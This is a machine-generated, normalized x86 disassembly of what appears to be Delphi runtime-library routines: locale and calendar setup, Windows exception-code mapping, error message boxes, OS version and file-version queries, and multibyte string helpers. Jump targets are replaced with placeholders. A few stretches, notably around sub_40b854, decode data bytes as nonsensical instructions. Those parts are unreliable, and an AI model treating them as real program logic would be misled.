mov ebp esp
push 0x0
push ebx
push esi
xor eax eax
push ebp
push sub_40b0f5
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0xffffffff
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_40426c
mov eax [ ebp - 0x4 ]
xor edx edx
call sub_4081c4
mov [ ebx * 4 + rw-data ] eax
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b0fc
lea eax [ ebp - 0x4 ]
call sub_404074
retn
inc ebx
sub_40b108
push ebp
mov ebp esp
push 0x0
push esi
xor eax eax
push ebp
push sub_40b19f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x100b
call sub_40ae80
mov eax [ ebp - 0x4 ]
mov edx 0x1
call sub_4081c4
mov esi eax
mov eax esi
add eax 0xfffffffd
sub eax 0x3
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b1a6
lea eax [ ebp - 0x4 ]
call sub_404074
retn
push 0x4
push esi
call GetThreadLocale
push eax
push sub_40b054
call EnumCalendarInfoA
mov edx 0x7
mov eax rw-data
mov [ eax ] 0xffffffff
add eax 0x4
dec edx
jne r-xdata
push 0x3
push esi
call GetThreadLocale
push eax
push sub_40b090
call EnumCalendarInfoA
sub_40b1b8
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_40b382
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx 0x1
mov eax edi
call sub_404074
lea eax [ ebp - 0x8 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x1009
call sub_40ae80
mov eax [ ebp - 0x8 ]
mov edx 0x1
call sub_4081c4
add eax 0xfffffffd
sub eax 0x3
jb r-xdata
mov eax esi
call sub_404334
cmp ebx eax
jle r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
mov al [ esi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b389
lea eax [ ebp - 0x14 ]
mov edx 0x4
call sub_404098
retn
mov al 0x1
add eax 0xfffffff3
sub eax 0x2
jb r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_408834
test eax eax
jne r-xdata
mov edx ebx
mov eax esi
call sub_40c228
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax esi
call sub_404594
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_40433c
add ebx [ ebp - 0x4 ]
jmp r-xdata
mov eax edi
mov edx esi
call sub_4040c8
jmp r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x4
call sub_408834
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_40433c
inc ebx
jmp r-xdata
mov eax esi
call sub_404334
cmp ebx eax
jle r-xdata
test al al
je r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_408834
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_40433c
add ebx 0x3
jmp r-xdata
inc ebx
mov al [ esi + ebx - 0x1 ]
sub al 0x47
je r-xdata
jmp r-xdata
mov al [ esi + ebx - 0x1 ]
sub al 0x59
je r-xdata
mov eax edi
mov edx r-xdata
call sub_40433c
inc ebx
jmp r-xdata
inc ebx
sub al 0x20
je r-xdata
mov eax edi
mov edx r-xdata
call sub_40433c
jmp r-xdata
sub al 0x20
jne r-xdata
lea eax [ ebp - 0xc ]
mov dl [ esi + ebx - 0x1 ]
call sub_40425c
mov edx [ ebp - 0xc ]
mov eax edi
call sub_40433c
lea eax [ ebp - 0x14 ]
mov dl [ esi + ebx - 0x1 ]
call sub_40425c
mov edx [ ebp - 0x14 ]
mov eax edi
call sub_40433c
sub_40b3ec
push ebp
mov ebp esp
add esp 0xfffffba8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
push 0x1c
lea eax [ ebp - 0x330 ]
push eax
push ebx
call VirtualQuery
cmp [ ebp - 0x320 ] 0x1000
jne r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ rw-data ]
push eax
call GetModuleFileNameA
mov eax ebx
call sub_40b3e0
mov [ ebp - 0x8 ] eax
jmp r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ ebp - 0x32c ]
push eax
call GetModuleFileNameA
test eax eax
jne r-xdata
lea eax [ ebp - 0x212 ]
mov dl 0x5c
call sub_40c478
mov edx eax
inc edx
lea eax [ ebp - 0x10d ]
mov ecx 0x104
call sub_408758
mov ebx r-xdata
mov edi r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
sub ebx [ ebp - 0x32c ]
mov [ ebp - 0x8 ] ebx
push 0x100
lea eax [ ebp - 0x312 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_405110
push eax
call LoadStringA
lea edx [ ebp - 0x458 ]
mov eax [ esi ]
call sub_4031f0
lea eax [ ebp - 0x458 ]
mov [ ebp - 0x358 ] eax
mov [ ebp - 0x354 ] 0x4
lea eax [ ebp - 0x10d ]
mov [ ebp - 0x350 ] eax
mov [ ebp - 0x34c ] 0x6
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x348 ] eax
mov [ ebp - 0x344 ] 0x5
mov [ ebp - 0x340 ] ebx
mov [ ebp - 0x33c ] 0x6
mov [ ebp - 0x338 ] edi
mov [ ebp - 0x334 ] 0x6
lea eax [ ebp - 0x358 ]
push eax
push 0x4
lea ecx [ ebp - 0x312 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_408d7c
mov eax [ ebp - 0x4 ]
call sub_4086f4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x4 ]
call sub_404534
mov ebx eax
mov eax ebx
call sub_4086f4
test eax eax
je r-xdata
cmp [ ebx + eax - 0x1 ] 0x2e
je r-xdata
mov edi r-xdata
sub_40b574
add esp 0xfffffbbc
push 0x400
lea ecx [ esp + 0x48 ]
call sub_40b3ec
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x40
lea eax [ esp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_405110
push eax
call LoadStringA
push 0x2010
lea eax [ esp + 0x8 ]
push eax
lea eax [ esp + 0x4c ]
push eax
push 0x0
call MessageBoxA
mov eax [ rw-data ]
call sub_402b0c
call sub_402834
lea eax [ esp + 0x44 ]
push eax
lea eax [ esp + 0x48 ]
push eax
call CharToOemA
push 0x0
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4c ]
call sub_4086f4
push eax
lea eax [ esp + 0x50 ]
push eax
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
jmp r-xdata
add esp 0x444
retn
sub_40b63c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_4040c8
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_40b678
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40b6d2
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_408dbc
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_4040c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b6d9
lea eax [ ebp - 0x4 ]
call sub_404074
retn
add esp 0xfffffff0
call sub_4035c4
sub_40b6d9
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_40b6f8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea edx [ edi + 0x4 ]
mov eax esi
call sub_405ba4
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_40b734
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40b7a0
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_405ba4
mov eax [ ebp - 0x8 ]
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_408dbc
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_4040c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b7a7
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404098
retn
add esp 0xfffffff0
call sub_4035c4
sub_40b7a7
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_40b7f4
push ebx
push esi
add esp 0xfffffff8
xor ebx ebx
call sub_4028a8
mov esi eax
jmp r-xdata
cmp ebx 0x6
jg r-xdata
cmp ebx 0x6
jg r-xdata
cmp esi [ ebx * 8 + rw-data ]
jne r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b734
mov ecx [ ebx * 8 + rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
jmp r-xdata
inc ebx
mov [ eax + 0xc ] esi
pop ecx
pop edx
pop esi
pop ebx
retn
sub_40b854
pop eax
mov eax 0xa0e0040
push esp
inc ebp
js r-xdata
cmp edi 0x8bc35bff
rcl [ ebp - 0x75 ] 0xec
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x4 ] ebx
jo r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ba4
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_40410c
jmp r-xdata
loopne r-xdata
push edx
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0xb
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x2
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b678
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b96b
lea eax [ ebp - 0x20 ]
call sub_404074
lea eax [ ebp - 0x4 ]
call sub_404074
retn
je r-xdata
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40b964
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
pop ebp
cld
mov edx [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
pop es
arpl [ gs : eax ] cx
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
push ebx
mov ebx edx
mov edx eax
dec dl
je r-xdata
push ebx
mov eax edx
jmp sub_403a2c
mov edx [ rw-data ]
jmp r-xdata
dec edx
sub dl 0x16
jb r-xdata
and eax 0xff
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40b63c
mov edx eax
jmp r-xdata
jmp r-xdata
call sub_40b7f4
mov edx eax
sub_40b8c8
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40b964
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ba4
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_40410c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0xb
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x2
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b678
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b96b
lea eax [ ebp - 0x20 ]
call sub_404074
lea eax [ ebp - 0x4 ]
call sub_404074
retn
sub_40b9b8
mov eax [ eax ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0x6
retn
cmp eax 0xc000008e
jg r-xdata
mov al 0xe
retn
sub eax 0x3d
je r-xdata
mov al 0xc
retn
sub eax 0xc0000093
je r-xdata
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd
retn
jmp r-xdata
mov al 0x9
retn
dec eax
je r-xdata
je r-xdata
mov al 0x7
retn
sub eax 0xc0000005
je r-xdata
mov al 0x16
retn
mov al 0x3
retn
dec eax
je r-xdata
mov al 0x8
retn
jmp r-xdata
mov al 0xb
retn
sub eax 0x87
je r-xdata
mov al 0x5
retn
jmp r-xdata
mov al 0x4
retn
dec eax
je r-xdata
jmp r-xdata
sub_40ba50
push ebp
mov ebp esp
add esp 0xfffffe90
push ebx
push esi
xor eax eax
mov [ ebp - 0x170 ] eax
mov [ ebp - 0x14c ] eax
mov [ ebp - 0x154 ] eax
mov [ ebp - 0x150 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40bc0b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ba4
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ba4
jmp r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x16c ] eax
mov [ ebp - 0x168 ] 0x5
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x164 ] eax
mov [ ebp - 0x160 ] 0xb
mov [ ebp - 0x15c ] esi
mov [ ebp - 0x158 ] 0x5
lea eax [ ebp - 0x16c ]
push eax
push 0x2
lea edx [ ebp - 0x170 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x170 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b678
mov ebx eax
push 0x105
lea eax [ ebp - 0x125 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetModuleFileNameA
test eax eax
je r-xdata
mov esi [ ebx + 0x18 ]
push 0x1c
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call VirtualQuery
cmp [ ebp - 0x10 ] 0x1000
jne r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x148 ] eax
mov [ ebp - 0x144 ] 0x5
lea eax [ ebp - 0x150 ]
lea edx [ ebp - 0x125 ]
mov ecx 0x105
call sub_4042e4
mov eax [ ebp - 0x150 ]
lea edx [ ebp - 0x14c ]
call sub_4085c4
mov eax [ ebp - 0x14c ]
mov [ ebp - 0x140 ] eax
mov [ ebp - 0x13c ] 0xb
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x138 ] eax
mov [ ebp - 0x134 ] 0xb
mov [ ebp - 0x130 ] esi
mov [ ebp - 0x12c ] 0x5
lea eax [ ebp - 0x148 ]
push eax
push 0x3
lea edx [ ebp - 0x154 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x154 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b678
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bc12
lea eax [ ebp - 0x170 ]
call sub_404074
lea eax [ ebp - 0x154 ]
mov edx 0x3
call sub_404098
lea eax [ ebp - 0x4 ]
call sub_404074
retn
sub_40bc1c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40bcd7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40b9b8
and eax 0xff
mov edx eax
add edx 0xfffffffd
sub edx 0x8
jb r-xdata
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40b63c
mov ebx eax
jmp r-xdata
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
push ebp
call sub_40ba50
pop ecx
mov ebx eax
jmp r-xdata
dec edx
sub edx 0xa
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bcde
lea eax [ ebp - 0x10 ]
call sub_404074
retn
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b678
mov ebx eax
sub_40bcf8
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
mov [ rw-data ] eax
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] r-xdata
mov eax [ rw-data ]
mov [ eax ] sub_40bce8
mov eax [ rw-data ]
mov edx [ r-xdata ]
mov [ eax ] edx
mov eax [ rw-data ]
mov [ eax ] sub_40ba38
mov eax [ rw-data ]
mov [ eax ] sub_40bc1c
mov eax sub_40b984
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40b9a0
mov edx [ rw-data ]
mov [ edx ] eax
retn
sub_40bd7c
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx - 0x8 ]
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
retn
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
call sub_4032a0
xor eax eax
mov [ rw-data ] eax
sub_40bdfc
add esp 0xffffff6c
mov [ esp ] 0x94
push esp
call GetVersionExA
test eax eax
je r-xdata
add esp 0x94
retn
mov eax [ esp + 0x10 ]
mov [ rw-data ] eax
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
mov eax [ esp + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ esp + 0xc ]
mov [ rw-data ] eax
mov eax [ esp + 0xc ]
and eax 0xffff
mov [ rw-data ] eax
jmp r-xdata
mov eax rw-data
lea edx [ esp + 0x14 ]
mov ecx 0x80
call sub_4042e4
sub_40be8c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_40bf62
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_40410c
lea eax [ ebp - 0x8 ]
call j_sub_404540
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_404534
push eax
call GetFileVersionInfoSizeA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bf69
lea eax [ ebp - 0x8 ]
call sub_404074
retn
mov eax ebx
call sub_4026cc
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_40bf45
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
push ebx
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_404534
push eax
call GetFileVersionInfoA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_4026ec
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
call VerQueryValueA
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
sub_40bf78
push esi
push edi
mov edi edx
xor edx edx
test eax eax
je r-xdata
mov eax edx
pop edi
pop esi
retn
cmp [ eax + edi ] 0x0
je r-xdata
test edi edi
jne r-xdata
mov esi edi
dec esi
jmp r-xdata
mov al [ eax ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
test esi esi
jl r-xdata
mov dl 0x1
jmp r-xdata
mov ecx edi
sub ecx esi
and ecx 0x80000001
jns r-xdata
mov cl [ eax + esi ]
and ecx 0xff
bt [ rw-data ] ecx
jb r-xdata
test ecx ecx
jne r-xdata
dec ecx
or ecx 0xfffffffe
inc ecx
dec esi
mov al [ eax + edi ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov dl 0x2
jmp r-xdata
mov dl 0x1
sub_40bff0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_404534
mov edx esi
dec edx
call sub_40bf78
sub_40c02c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_404334
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_40c054
pop esi
pop ebx
retn
mov eax ebx
call sub_404334
mov esi eax
sub_40c054
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor edi edi
test esi esi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_404334
cmp esi eax
jg r-xdata
mov edi esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
xor edi edi
cmp esi eax
jl r-xdata
mov dl [ ebx + eax - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
inc eax
mov edx eax
mov eax ebx
call sub_40c264
jmp r-xdata
inc edi
cmp esi eax
jge r-xdata
sub_40c0ac
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax edi
call sub_404334
mov [ ebp - 0xc ] eax
mov esi 0x1
mov ebx 0x1
jmp r-xdata
cmp ebx [ ebp - 0xc ]
jge r-xdata
cmp esi [ ebp - 0x4 ]
jne r-xdata
cmp esi [ ebp - 0x4 ]
jl r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] esi
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp ebx [ ebp - 0xc ]
jge r-xdata
inc esi
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc ebx
mov edx ebx
mov eax edi
call sub_40c264
mov ebx eax
jmp r-xdata
mov edx ebx
mov eax edi
call sub_40c264
dec eax
mov ebx eax
sub_40c13c
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_404334
cmp ebx eax
jg r-xdata
cmp ebx 0x1
jle r-xdata
mov [ esp ] ebx
cmp [ rw-data ] 0x0
je r-xdata
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
dec edx
mov eax esi
call sub_40c0ac
dec ebx
cmp ebx [ esp + 0x4 ]
jg r-xdata
xor eax eax
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_404334
cmp eax [ esp ]
jg r-xdata
inc [ esp ]
jmp r-xdata
sub_40c1a0
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_404334
cmp ebx eax
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax esi
call sub_404334
mov ebx eax
mov [ esp ] ebx
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
mov eax esi
call sub_40c0ac
mov eax esi
call sub_404334
cmp eax [ esp ]
jge r-xdata
mov eax esi
call sub_404334
mov [ esp ] eax
jmp r-xdata
sub_40c228
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x1
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ ebx + esi - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax ebx
call sub_404534
add eax esi
dec eax
call sub_40c200
sub_40c264
push ebx
push esi
mov ebx edx
mov esi eax
lea eax [ ebx + 0x1 ]
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax esi
call sub_404534
add eax ebx
dec eax
call sub_40c200
add eax ebx
sub_40c2a0
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_404334
cmp ebx eax
jg r-xdata
cmp [ esi + ebx - 0x1 ] 0x5c
jne r-xdata
mov edx ebx
mov eax esi
call sub_40bff0
test al al
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_40c2d4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx esi
call sub_4040c8
mov eax [ ebx ]
call sub_404334
mov edx eax
mov eax [ ebx ]
call sub_40c2a0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx r-xdata
call sub_40433c
sub_40c314
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
xor edi edi
mov eax ebx
call sub_404534
push eax
mov eax esi
call sub_404534
mov ebp eax
mov eax ebp
pop edx
call sub_40c3d8
mov ebx eax
test ebx ebx
je r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi ebx
sub edi ebp
inc edi
sub_40c34c
push ebx
push esi
push edi
push ebp
mov edi edx
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx edi
mov eax esi
call sub_407e70
mov eax esi
call sub_404334
mov ebp eax
mov eax edi
mov edx ebp
call sub_4046c0
mov ebx 0x1
cmp ebp ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call j_sub_404540#2
mov dl [ esi + ebx - 0x1 ]
mov [ eax + ebx - 0x1 ] dl
mov al [ esi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ edi ]
mov al [ eax + ebx - 0x1 ]
add al 0xbf
sub al 0x1a
jae r-xdata
inc ebx
mov eax edi
call j_sub_404540#2
mov dl [ esi + ebx - 0x1 ]
mov [ eax + ebx - 0x1 ] dl
jmp r-xdata
inc ebx
cmp ebp ebx
jge r-xdata
mov eax edi
call j_sub_404540#2
add [ eax + ebx - 0x1 ] 0x20
jmp r-xdata
sub_40c3d8
push ebx
push esi
